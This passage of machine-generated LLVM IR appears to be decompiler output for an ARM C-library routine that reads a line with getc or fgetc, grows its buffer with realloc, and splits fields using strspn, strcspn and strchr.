  %v1_169d8 = add i32 %v0_169d8, 12
  br i1 %v2_169d0, label %dec_label_pc_169d8, label %dec_label_pc_169f0

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169b8
  store i32 %v1_169d8, i32* %r0.global-to-local, align 4
  %v1_169dc = inttoptr i32 %v1_169d8 to i32*
  %v2_169dc = load i32, i32* %v1_169dc, align 4
  store i32 %v2_169dc, i32* %r0.global-to-local, align 4
  %v3_169dc = add i32 %v0_169d8, 16
  %v4_169dc = inttoptr i32 %v3_169dc to i32*
  %v5_169dc = load i32, i32* %v4_169dc, align 4
  store i32 %v5_169dc, i32* %r2.global-to-local, align 4
  %v3_169e4 = inttoptr i32 %v2_169dc to i8*
  %v4_169e4 = call i32 @__GI_memset(i8* %v3_169e4, i32 0, i32 %v5_169dc)
  store i32 %v4_169e4, i32* %r0.global-to-local, align 4
  %v0_169e8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16c08

dec_label_pc_169f0:                               ; preds = %dec_label_pc_169b8
  %v2_169f0 = inttoptr i32 %v1_169d8 to i32*
  %v3_169f0 = load i32, i32* %v2_169f0, align 4
  store i32 %v3_169f0, i32* @r4, align 4
  %v1_169f4 = load i32, i32* @r6, align 4
  %v2_169f4 = add i32 %v1_169f4, %v3_169f0
  %v3_169f4 = inttoptr i32 %v2_169f4 to i8*
  store i32 %v2_169f4, i32* %r0.global-to-local, align 4
  %v3_169f8 = call i32 @strlen(i8* %v3_169f4)
  %v0_16a00 = load i32, i32* @r6, align 4
  %v2_16a00 = add i32 %v0_16a00, %v3_169f8
  store i32 %v2_16a00, i32* @r6, align 4
  %v0_16a04 = load i32, i32* @r4, align 4
  store i32 %v0_16a04, i32* @r0, align 4
  %v2_16a08 = call i32 @__GI_strchr(i32 %v0_16a04, i32 10)
  store i32 %v2_16a08, i32* %r0.global-to-local, align 4
  %v2_16a0c = icmp eq i32 %v2_16a08, 0
  store i1 %v2_16a0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a0c, label %dec_label_pc_16a38, label %dec_label_pc_16a14

dec_label_pc_16a14:                               ; preds = %dec_label_pc_169f0
  %v1_16a14 = inttoptr i32 %v2_16a08 to i8*
  %v2_16a14 = load i8, i8* %v1_16a14, align 1
  %v3_16a14 = zext i8 %v2_16a14 to i32
  %v1_16a18 = add nuw nsw i32 %v3_16a14, 255
  %v1_16a1c = urem i32 %v1_16a18, 256
  store i32 %v1_16a1c, i32* %r3.global-to-local, align 4
  %v7_16a20 = icmp eq i32 %v1_16a1c, 92
  store i1 %v7_16a20, i1* %cpsr_z.global-to-local, align 1
  %v1_16a24 = trunc i32 %v1_16a18 to i8
  store i8 %v1_16a24, i8* %v1_16a14, align 1
  %v0_16a28 = load i32, i32* @r6, align 4
  %v1_16a28 = add i32 %v0_16a28, -1
  store i32 %v1_16a28, i32* @r6, align 4
  %v0_16a2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16a2c, label %dec_label_pc_16a30, label %dec_label_pc_16abc

dec_label_pc_16a30:                               ; preds = %dec_label_pc_16a14
  %v1_16a30 = add i32 %v0_16a28, -2
  store i32 %v1_16a30, i32* @r6, align 4
  br label %dec_label_pc_169b8

dec_label_pc_16a38:                               ; preds = %dec_label_pc_169f0
  %v0_16a38 = load i32, i32* @r5, align 4
  %v1_16a38 = add i32 %v0_16a38, 20
  %v2_16a38 = inttoptr i32 %v1_16a38 to i32*
  %v3_16a38 = load i32, i32* %v2_16a38, align 4
  store i32 %v3_16a38, i32* %r3.global-to-local, align 4
  %v2_16a3c = icmp eq i32 %v3_16a38, 0
  store i1 %v2_16a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a3c, label %dec_label_pc_16a74, label %dec_label_pc_16a44

dec_label_pc_16a44:                               ; preds = %dec_label_pc_16a38
  %v1_16a44 = add i32 %v0_16a38, 16
  %v2_16a44 = inttoptr i32 %v1_16a44 to i32*
  %v3_16a44 = load i32, i32* %v2_16a44, align 4
  store i32 %v3_16a44, i32* %r3.global-to-local, align 4
  %v1_16a48 = add i32 %v0_16a38, 8
  %v2_16a48 = inttoptr i32 %v1_16a48 to i32*
  %v3_16a48 = load i32, i32* %v2_16a48, align 4
  %v1_16a4c = add i32 %v3_16a44, 4096
  store i32 %v1_16a4c, i32* %r3.global-to-local, align 4
  %v2_16a50 = add i32 %v3_16a48, %v1_16a4c
  store i32 %v1_16a4c, i32* %v2_16a44, align 4
  %v0_16a58 = load i32, i32* @r5, align 4
  %v1_16a58 = add i32 %v0_16a58, 4
  %v2_16a58 = inttoptr i32 %v1_16a58 to i32*
  %v3_16a58 = load i32, i32* %v2_16a58, align 4
  store i32 %v3_16a58, i32* %r0.global-to-local, align 4
  %v4_16a5c = inttoptr i32 %v3_16a58 to i32*
  %v5_16a5c = call i32 @realloc(i32* %v4_16a5c, i32 %v2_16a50, i32 %v2_169c8, i32 %v1_16a4c)
  store i32 %v5_16a5c, i32* %r0.global-to-local, align 4
  %v0_16a60 = load i32, i32* @r5, align 4
  %v1_16a60 = add i32 %v0_16a60, 8
  %v2_16a60 = inttoptr i32 %v1_16a60 to i32*
  %v3_16a60 = load i32, i32* %v2_16a60, align 4
  %v2_16a64 = add i32 %v3_16a60, %v5_16a5c
  store i32 %v2_16a64, i32* %r3.global-to-local, align 4
  %v2_16a68 = add i32 %v0_16a60, 12
  %v3_16a68 = inttoptr i32 %v2_16a68 to i32*
  store i32 %v2_16a64, i32* %v3_16a68, align 4
  %v1_16a6c = load i32, i32* @r5, align 4
  %v2_16a6c = add i32 %v1_16a6c, 4
  %v3_16a6c = inttoptr i32 %v2_16a6c to i32*
  store i32 %v5_16a5c, i32* %v3_16a6c, align 4
  %v0_169c0.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_169b8

dec_label_pc_16a74:                               ; preds = %dec_label_pc_16a38, %.dec_label_pc_16a74_crit_edge
  %v0_16a74 = phi i32 [ %v0_16a74.pre, %.dec_label_pc_16a74_crit_edge ], [ %v0_16a38, %dec_label_pc_16a38 ]
  %v1_16a74 = inttoptr i32 %v0_16a74 to i32*
  %v2_16a74 = load i32, i32* %v1_16a74, align 4
  store i32 %v2_16a74, i32* @r1, align 4
  %v1_16a78 = add i32 %v2_16a74, 52
  %v2_16a78 = inttoptr i32 %v1_16a78 to i32*
  %v3_16a78 = load i32, i32* %v2_16a78, align 4
  store i32 %v3_16a78, i32* %r3.global-to-local, align 4
  %v2_16a7c = icmp eq i32 %v3_16a78, 0
  store i1 %v2_16a7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a7c, label %dec_label_pc_16aa8, label %dec_label_pc_16a84

dec_label_pc_16a84:                               ; preds = %dec_label_pc_16a74
  %v1_16a84 = add i32 %v2_16a74, 16
  %v2_16a84 = inttoptr i32 %v1_16a84 to i32*
  %v3_16a84 = load i32, i32* %v2_16a84, align 4
  store i32 %v3_16a84, i32* %r2.global-to-local, align 4
  %v1_16a88 = add i32 %v2_16a74, 24
  %v2_16a88 = inttoptr i32 %v1_16a88 to i32*
  %v3_16a88 = load i32, i32* %v2_16a88, align 4
  store i32 %v3_16a88, i32* %r3.global-to-local, align 4
  %v3_16a8c = icmp ult i32 %v3_16a84, %v3_16a88
  %v9_16a8c = icmp eq i32 %v3_16a84, %v3_16a88
  store i1 %v9_16a8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16a8c, label %dec_label_pc_16ab0thread-pre-split, label %dec_label_pc_16a9c

dec_label_pc_16a9c:                               ; preds = %dec_label_pc_16a84
  store i32 %v2_16a74, i32* %r0.global-to-local, align 4
  %v1_16aa0 = inttoptr i32 %v2_16a74 to i16*
  %v2_16aa0 = call i32 @getc_unlocked(i16* %v1_16aa0)
  store i32 %v2_16aa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ab0

dec_label_pc_16aa8:                               ; preds = %dec_label_pc_16a74
  store i32 %v2_16a74, i32* %r0.global-to-local, align 4
  %v1_16aac = call i32 @__GI_fgetc(i32 %v2_16a74)
  store i32 %v1_16aac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ab0

dec_label_pc_16ab0thread-pre-split:               ; preds = %dec_label_pc_16a84
  %v2_16a90 = inttoptr i32 %v3_16a84 to i8*
  %v3_16a90 = load i8, i8* %v2_16a90, align 1
  %v4_16a90 = zext i8 %v3_16a90 to i32
  store i32 %v4_16a90, i32* %r0.global-to-local, align 4
  %v6_16a90 = add i32 %v3_16a84, 1
  store i32 %v6_16a90, i32* %r2.global-to-local, align 4
  store i32 %v6_16a90, i32* %v2_16a84, align 4
  %v0_16ab0.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ab0

dec_label_pc_16ab0:                               ; preds = %dec_label_pc_16ab0thread-pre-split, %dec_label_pc_16a9c, %dec_label_pc_16aa8
  %v1_16ab4 = phi i32 [ %v0_16ab0.pr, %dec_label_pc_16ab0thread-pre-split ], [ %v2_16aa0, %dec_label_pc_16a9c ], [ %v1_16aac, %dec_label_pc_16aa8 ]
  %v7_16ab0 = icmp eq i32 %v1_16ab4, 10
  store i1 %v7_16ab0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16ab0, label %dec_label_pc_16abc.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_16ab0
  %v8_16ab4 = icmp eq i32 %v1_16ab4, -1
  store i1 %v8_16ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_16ab4, label %dec_label_pc_16abc.loopexit, label %.dec_label_pc_16a74_crit_edge

.dec_label_pc_16a74_crit_edge:                    ; preds = %bb66
  %v0_16a74.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16a74

dec_label_pc_16abc.loopexit:                      ; preds = %bb66, %dec_label_pc_16ab0
  %v0_16abc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16abc

dec_label_pc_16abc:                               ; preds = %dec_label_pc_16a14, %dec_label_pc_16abc.loopexit
  %v0_16abc = phi i32 [ %v0_16abc.pre, %dec_label_pc_16abc.loopexit ], [ %v1_16a28, %dec_label_pc_16a14 ]
  %v7_16abc = icmp eq i32 %v0_16abc, -1
  store i1 %v7_16abc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16abc, label %dec_label_pc_16c04, label %dec_label_pc_16ac4

dec_label_pc_16ac4:                               ; preds = %dec_label_pc_16abc
  store i32 %v1_1692c, i32* %r3.global-to-local, align 4
  store i1 %v2_16ac8, i1* %cpsr_z.global-to-local, align 1
  %v0_16acc = load i32, i32* @r5, align 4
  %v1_16acc = add i32 %v0_16acc, 12
  %v2_16acc = inttoptr i32 %v1_16acc to i32*
  %v3_16acc = load i32, i32* %v2_16acc, align 4
  store i32 %v3_16acc, i32* @r4, align 4
  br i1 %v2_16ac8, label %dec_label_pc_16ae4, label %dec_label_pc_16ad4

dec_label_pc_16ad4:                               ; preds = %dec_label_pc_16ac4
  store i32 %v3_16acc, i32* @r0, align 4
  %v0_16ad8 = load i32, i32* @sl, align 4
  %v2_16adc = inttoptr i32 %v3_16acc to i8*
  %v3_16adc = call i32 @__GI_strspn(i8* %v2_16adc, i32 %v0_16ad8)
  store i32 %v3_16adc, i32* %r0.global-to-local, align 4
  %v0_16ae0 = load i32, i32* @r4, align 4
  %v2_16ae0 = add i32 %v0_16ae0, %v3_16adc
  store i32 %v2_16ae0, i32* @r4, align 4
  br label %dec_label_pc_16ae4

dec_label_pc_16ae4:                               ; preds = %dec_label_pc_16ac4, %dec_label_pc_16ad4
  %v0_16ae4 = phi i32 [ %v3_16acc, %dec_label_pc_16ac4 ], [ %v2_16ae0, %dec_label_pc_16ad4 ]
  %v1_16ae4 = inttoptr i32 %v0_16ae4 to i8*
  %v2_16ae4 = load i8, i8* %v1_16ae4, align 1
  %v3_16ae4 = zext i8 %v2_16ae4 to i32
  store i32 %v3_16ae4, i32* %r2.global-to-local, align 4
  %v2_16ae8 = icmp eq i8 %v2_16ae4, 0
  store i1 %v2_16ae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ae8, label %dec_label_pc_16954.backedge, label %dec_label_pc_16af0

dec_label_pc_16954.backedge:                      ; preds = %dec_label_pc_16ae4, %dec_label_pc_16af0, %dec_label_pc_16bfc
  %v0_16954.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16954

dec_label_pc_16af0:                               ; preds = %dec_label_pc_16ae4
  %v0_16af0 = load i32, i32* @r7, align 4
  %v1_16af0 = inttoptr i32 %v0_16af0 to i8*
  %v2_16af0 = load i8, i8* %v1_16af0, align 1
  %v3_16af0 = zext i8 %v2_16af0 to i32
  store i32 %v3_16af0, i32* %r3.global-to-local, align 4
  %v9_16af4 = icmp eq i8 %v2_16af0, %v2_16ae4
  store i1 %v9_16af4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16af4, label %dec_label_pc_16954.backedge, label %dec_label_pc_16afc

dec_label_pc_16afc:                               ; preds = %dec_label_pc_16af0
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_16b00 = load i32, i32* @r5, align 4
  %v1_16b00 = add i32 %v0_16b00, 4
  %v2_16b00 = inttoptr i32 %v1_16b00 to i32*
  %v3_16b00 = load i32, i32* %v2_16b00, align 4
  store i32 %v3_16b00, i32* %r0.global-to-local, align 4
  %v0_16b04 = load i32, i32* @fp, align 4
  store i32 %v3_16b00, i32* %v1_16b20, align 4
  store i32 %v3_16918, i32* %r2.global-to-local, align 4
  %v3_16b10 = inttoptr i32 %v3_16b00 to i8*
  %v4_16b10 = call i32 @__GI_memset(i8* %v3_16b10, i32 %v0_16b04, i32 %v3_16918)
  store i32 %v4_16b10, i32* %r0.global-to-local, align 4
  %v0_16b14 = load i32, i32* @fp, align 4
  store i32 %v0_16b14, i32* @r6, align 4
  %v0_16bd412 = load i32, i32* @r4, align 4
  %v1_16bd413 = inttoptr i32 %v0_16bd412 to i8*
  %v2_16bd414 = load i8, i8* %v1_16bd413, align 1
  %v3_16bd415 = zext i8 %v2_16bd414 to i32
  store i32 %v3_16bd415, i32* %r2.global-to-local, align 4
  %v2_16bd816 = icmp eq i8 %v2_16bd414, 0
  store i1 %v2_16bd816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16bd816, label %dec_label_pc_16bf0, label %dec_label_pc_16be0

dec_label_pc_16b1c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_16b20 = load i32, i32* %v1_16b20, align 4
  store i32 %v2_16b20, i32* %r3.global-to-local, align 4
  store i32 %v1_16930, i32* %r2.global-to-local, align 4
  %v9_16b28 = icmp eq i32 %v2_16b2c, %v1_16930
  store i1 %v9_16b28, i1* %cpsr_z.global-to-local, align 1
  %v5_16b2c = mul i32 %v2_16b2c, 4
  %v6_16b2c = add i32 %v2_16b20, %v5_16b2c
  %v7_16b2c = inttoptr i32 %v6_16b2c to i32*
  store i32 %v0_16b2c, i32* %v7_16b2c, align 4
  br i1 %v9_16b28, label %dec_label_pc_16b34, label %dec_label_pc_16b40

dec_label_pc_16b34:                               ; preds = %dec_label_pc_16b1c
  store i32 %v1_1693c, i32* %r3.global-to-local, align 4
  store i1 %v2_16b38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b38, label %dec_label_pc_16b40, label %dec_label_pc_16b60

dec_label_pc_16b40:                               ; preds = %dec_label_pc_16b34, %dec_label_pc_16b1c
  %v0_16b40 = load i32, i32* @r7, align 4
  %v1_16b40 = inttoptr i32 %v0_16b40 to i8*
  %v2_16b40 = load i8, i8* %v1_16b40, align 1
  %v3_16b40 = zext i8 %v2_16b40 to i32
  store i32 %v3_16b40, i32* %r3.global-to-local, align 4
  %v2_16b44 = icmp eq i8 %v2_16b40, 0
  store i1 %v2_16b44, i1* %cpsr_z.global-to-local, align 1
  %v0_16b48 = load i32, i32* @r4, align 4
  store i32 %v0_16b48, i32* @r0, align 4
  %v1_16b4c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_16b44, i32 %v1_16b4c, i32 %v0_16b40
  store i32 %storemerge, i32* @r1, align 4
  %v0_16b54 = call i32 @strcspn()
  store i32 %v0_16b54, i32* %r0.global-to-local, align 4
  %v0_16b58 = load i32, i32* @r4, align 4
  %v2_16b58 = add i32 %v0_16b58, %v0_16b54
  store i32 %v2_16b58, i32* @r4, align 4
  br label %dec_label_pc_16b98

dec_label_pc_16b60:                               ; preds = %dec_label_pc_16b34
  %v0_16b60 = load i32, i32* @r4, align 4
  store i32 %v0_16b60, i32* @r0, align 4
  %v0_16b64 = load i32, i32* @r7, align 4
  %v1_16b64 = inttoptr i32 %v0_16b64 to i8*
  %v2_16b64 = load i8, i8* %v1_16b64, align 1
  %v3_16b64 = zext i8 %v2_16b64 to i32
  %v5_16b68 = call i32 @__GI_strchrnul(i32 %v0_16b60, i32 %v3_16b64, i32 %v1_16930, i32 %v1_1693c)
  store i32 %v5_16b68, i32* %r0.global-to-local, align 4
  store i32 %v1_1692c, i32* %r2.global-to-local, align 4
  store i1 %v2_16ac8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_16b68, i32* @r4, align 4
  br i1 %v2_16ac8, label %dec_label_pc_16b98, label %dec_label_pc_16b84

dec_label_pc_16b80:                               ; preds = %dec_label_pc_16b84
  %v1_16b80 = add i32 %v0_16b98.pre, -1
  store i32 %v1_16b80, i32* @r4, align 4
  br label %dec_label_pc_16b84

dec_label_pc_16b84:                               ; preds = %dec_label_pc_16b60, %dec_label_pc_16b80
  %v0_16b84 = phi i32 [ %v1_16b80, %dec_label_pc_16b80 ], [ %v5_16b68, %dec_label_pc_16b60 ]
  %v1_16b84 = add i32 %v0_16b84, -1
  %v2_16b84 = inttoptr i32 %v1_16b84 to i8*
  %v3_16b84 = load i8, i8* %v2_16b84, align 1
  %v4_16b84 = zext i8 %v3_16b84 to i32
  %v0_16b88 = load i32, i32* @sl, align 4
  store i32 %v0_16b88, i32* @r0, align 4
  %v2_16b8c = call i32 @__GI_strchr(i32 %v0_16b88, i32 %v4_16b84)
  store i32 %v2_16b8c, i32* %r0.global-to-local, align 4
  %v2_16b90 = icmp eq i32 %v2_16b8c, 0
  store i1 %v2_16b90, i1* %cpsr_z.global-to-local, align 1
  %v0_16b98.pre = load i32, i32* @r4, align 4
  br i1 %v2_16b90, label %dec_label_pc_16b98, label %dec_label_pc_16b80

dec_label_pc_16b98:                               ; preds = %dec_label_pc_16b84, %dec_label_pc_16b60, %dec_label_pc_16b40
  %v3_16ba4 = phi i32 [ %v5_16b68, %dec_label_pc_16b60 ], [ %v2_16b58, %dec_label_pc_16b40 ], [ %v0_16b98.pre, %dec_label_pc_16b84 ]
  %v1_16b98 = inttoptr i32 %v3_16ba4 to i8*
  %v2_16b98 = load i8, i8* %v1_16b98, align 1
  %v3_16b98 = zext i8 %v2_16b98 to i32
  store i32 %v3_16b98, i32* %r2.global-to-local, align 4
  %v0_16b9c = load i32, i32* @r7, align 4
  %v1_16b9c = inttoptr i32 %v0_16b9c to i8*
  %v2_16b9c = load i8, i8* %v1_16b9c, align 1
  %v3_16b9c = zext i8 %v2_16b9c to i32
  store i32 %v3_16b9c, i32* %r3.global-to-local, align 4
  %v9_16ba0 = icmp eq i8 %v2_16b9c, %v2_16b98
  store i1 %v9_16ba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16ba0, label %bb69, label %dec_label_pc_16bac

bb69:                                             ; preds = %dec_label_pc_16b98
  %v1_16ba4 = load i32, i32* @fp, align 4
  %v2_16ba4 = trunc i32 %v1_16ba4 to i8
  store i8 %v2_16ba4, i8* %v1_16b98, align 1
  %v0_16ba8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16ba8.pr, label %bb71, label %.dec_label_pc_16bac_crit_edge

.dec_label_pc_16bac_crit_edge:                    ; preds = %bb69
  %v0_16bac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16bac

dec_label_pc_16bac:                               ; preds = %.dec_label_pc_16bac_crit_edge, %dec_label_pc_16b98
  %v0_16bac = phi i32 [ %v0_16bac.pre, %.dec_label_pc_16bac_crit_edge ], [ %v3_16b98, %dec_label_pc_16b98 ]
  %v2_16bac = icmp eq i32 %v0_16bac, 0
  store i1 %v2_16bac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16bac, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_16bac
  %v1_16bb0 = load i32, i32* @fp, align 4
  %v2_16bb0 = trunc i32 %v1_16bb0 to i8
  %v3_16bb0 = load i32, i32* @r4, align 4
  %v4_16bb0 = inttoptr i32 %v3_16bb0 to i8*
  store i8 %v2_16bb0, i8* %v4_16bb0, align 1
  %v5_16bb0 = load i32, i32* @r4, align 4
  %v6_16bb0 = add i32 %v5_16bb0, 1
  store i32 %v6_16bb0, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_16bac, %bb70
  %v2_16bb4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_16bb4, i32* %r3.global-to-local, align 4
  %v2_16bb8 = icmp eq i32 %v2_16bb4, 0
  store i1 %v2_16bb8, i1* %cpsr_z.global-to-local, align 1
  %v0_16bd4.pre = load i32, i32* @r4, align 4
  br i1 %v2_16bb8, label %dec_label_pc_16bd0, label %dec_label_pc_16bc0

dec_label_pc_16bc0:                               ; preds = %bb71
  store i32 %v0_16bd4.pre, i32* @r0, align 4
  %v0_16bc4 = load i32, i32* @sl, align 4
  %v2_16bc8 = inttoptr i32 %v0_16bd4.pre to i8*
  %v3_16bc8 = call i32 @__GI_strspn(i8* %v2_16bc8, i32 %v0_16bc4)
  store i32 %v3_16bc8, i32* %r0.global-to-local, align 4
  %v0_16bcc = load i32, i32* @r4, align 4
  %v2_16bcc = add i32 %v0_16bcc, %v3_16bc8
  store i32 %v2_16bcc, i32* @r4, align 4
  br label %dec_label_pc_16bd0

dec_label_pc_16bd0:                               ; preds = %bb71, %dec_label_pc_16bc0
  %v0_16bd4 = phi i32 [ %v2_16bcc, %dec_label_pc_16bc0 ], [ %v0_16bd4.pre, %bb71 ]
  %v0_16bd0 = load i32, i32* @r6, align 4
  %v1_16bd0 = add i32 %v0_16bd0, 1
  store i32 %v1_16bd0, i32* @r6, align 4
  %v1_16bd4 = inttoptr i32 %v0_16bd4 to i8*
  %v2_16bd4 = load i8, i8* %v1_16bd4, align 1
  %v3_16bd4 = zext i8 %v2_16bd4 to i32
  store i32 %v3_16bd4, i32* %r2.global-to-local, align 4
  %v2_16bd8 = icmp eq i8 %v2_16bd4, 0
  store i1 %v2_16bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16bd8, label %dec_label_pc_16bf0, label %dec_label_pc_16be0

dec_label_pc_16be0:                               ; preds = %dec_label_pc_16afc, %dec_label_pc_16bd0
  %v0_16b2c = phi i32 [ %v0_16bd4, %dec_label_pc_16bd0 ], [ %v0_16bd412, %dec_label_pc_16afc ]
  %v2_16b2c = phi i32 [ %v1_16bd0, %dec_label_pc_16bd0 ], [ %v0_16b14, %dec_label_pc_16afc ]
  %v1_16be4 = phi i32 [ %v3_16bd4, %dec_label_pc_16bd0 ], [ %v3_16bd415, %dec_label_pc_16afc ]
  %v0_16be0 = load i32, i32* @r7, align 4
  %v1_16be0 = inttoptr i32 %v0_16be0 to i8*
  %v2_16be0 = load i8, i8* %v1_16be0, align 1
  %v3_16be0 = zext i8 %v2_16be0 to i32
  store i32 %v3_16be0, i32* %r3.global-to-local, align 4
  %v9_16be4 = icmp eq i32 %v3_16be0, %v1_16be4
  store i1 %v9_16be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16be4, label %dec_label_pc_16bf0, label %bb72

bb72:                                             ; preds = %dec_label_pc_16be0
  %v2_16be8 = load i32, i32* @sb, align 4
  %v3_16be8 = sub i32 %v2_16b2c, %v2_16be8
  %v5_16be8 = xor i32 %v2_16be8, %v2_16b2c
  %v6_16be8 = xor i32 %v3_16be8, %v2_16b2c
  %v7_16be8 = and i32 %v6_16be8, %v5_16be8
  %v8_16be8 = icmp slt i32 %v7_16be8, 0
  %v9_16be8 = icmp slt i32 %v3_16be8, 0
  %v10_16be8 = icmp eq i32 %v2_16b2c, %v2_16be8
  store i1 %v10_16be8, i1* %cpsr_z.global-to-local, align 1
  %v2_16bec = xor i1 %v9_16be8, %v8_16be8
  br i1 %v2_16bec, label %dec_label_pc_16b1c, label %dec_label_pc_16bf0

dec_label_pc_16bf0:                               ; preds = %dec_label_pc_16be0, %dec_label_pc_16bd0, %bb72, %dec_label_pc_16afc
  %v0_16bf4 = phi i32 [ %v0_16b14, %dec_label_pc_16afc ], [ %v2_16b2c, %dec_label_pc_16be0 ], [ %v1_16bd0, %dec_label_pc_16bd0 ], [ %v2_16b2c, %bb72 ]
  store i32 %v3_16914, i32* %r2.global-to-local, align 4
  %v9_16bf4 = icmp eq i32 %v0_16bf4, %v3_16914
  store i1 %v9_16bf4, i1* %cpsr_z.global-to-local, align 1
  %v6_16bf8 = icmp slt i32 %v0_16bf4, %v3_16914
  br i1 %v6_16bf8, label %dec_label_pc_16bfc, label %dec_label_pc_16c08

dec_label_pc_16bfc:                               ; preds = %dec_label_pc_16bf0
  %v0_16bfc = load i32, i32* @r8, align 4
  %v1_16bfc = and i32 %v0_16bfc, 1048576
  %v2_16bfc = icmp eq i32 %v1_16bfc, 0
  store i1 %v2_16bfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16bfc, label %dec_label_pc_16954.backedge, label %dec_label_pc_16c04

dec_label_pc_16c04:                               ; preds = %dec_label_pc_16bfc, %dec_label_pc_16abc, %.thread, %entry
  br label %dec_label_pc_16c08

dec_label_pc_16c08:                               ; preds = %dec_label_pc_16bf0, %dec_label_pc_169d8, %dec_label_pc_16c04
  %v0_16c08 = phi i32 [ %v0_169e8, %dec_label_pc_169d8 ], [ 0, %dec_label_pc_16c04 ], [ %v0_16bf4, %dec_label_pc_16bf0 ]
  store i32 %v0_16c08, i32* %r0.global-to-local, align 4
  store i32 %v3_168f0, i32* @r4, align 4
  store i32 %v6_168f0, i32* @r5, align 4
  store i32 %v9_168f0, i32* @r6, align 4
  store i32 %v12_168f0, i32* @r7, align 4
  store i32 %v15_168f0, i32* @r8, align 4
  store i32 %v18_168f0, i32* @sb, align 4
  store i32 %v21_168f0, i32* @sl, align 4
  store i32 %v24_168f0, i32* @fp, align 4
  ret i32 %v0_16c08

; uselistorder directives
  uselistorder i32 %v0_16c08, { 1, 0 }
  uselistorder i32 %v0_16bf4, { 0, 2, 1 }
  uselistorder i32 %v3_16be8, { 1, 0 }
  uselistorder i32 %v2_16be8, { 1, 0, 2 }
  uselistorder i32 %v2_16b2c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_16bd4.pre, { 0, 2, 1 }
  uselistorder i32 %v5_16b68, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16b14, { 1, 0, 2 }
  uselistorder i1 %v9_16af4, { 1, 0 }
  uselistorder i32 %v3_16acc, { 0, 2, 1, 3 }
  uselistorder i1 %v7_16abc, { 1, 0 }
  uselistorder i1 %v8_16ab4, { 1, 0 }
  uselistorder i32 %v3_16a84, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_16a74, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_16a5c, { 1, 0, 2 }
  uselistorder i32 %v1_16a4c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16a38, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16a30, { 1, 0 }
  uselistorder i32 %v1_16a1c, { 1, 0 }
  uselistorder i32 %v1_16a18, { 1, 0 }
  uselistorder i32 %v2_169f4, { 1, 0 }
  uselistorder i32 %v1_169d8, { 2, 0, 1 }
  uselistorder i32 %v0_169c0, { 1, 0 }
  uselistorder i32 %v1_169b0, { 0, 2, 1 }
  uselistorder i32* %v1_16b20, { 1, 0 }
  uselistorder i1 %v2_16ac8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1693c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_16930, { 2, 1, 0 }
  uselistorder i32 %v3_16918, { 1, 2, 0 }
  uselistorder i32 %v3_16914, { 2, 1, 0 }
  uselistorder i32 %v1_1690c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 81, { 0, 3, 1, 2 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16c08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16bf0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16be0, { 1, 0 }
  uselistorder label %dec_label_pc_16bd0, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
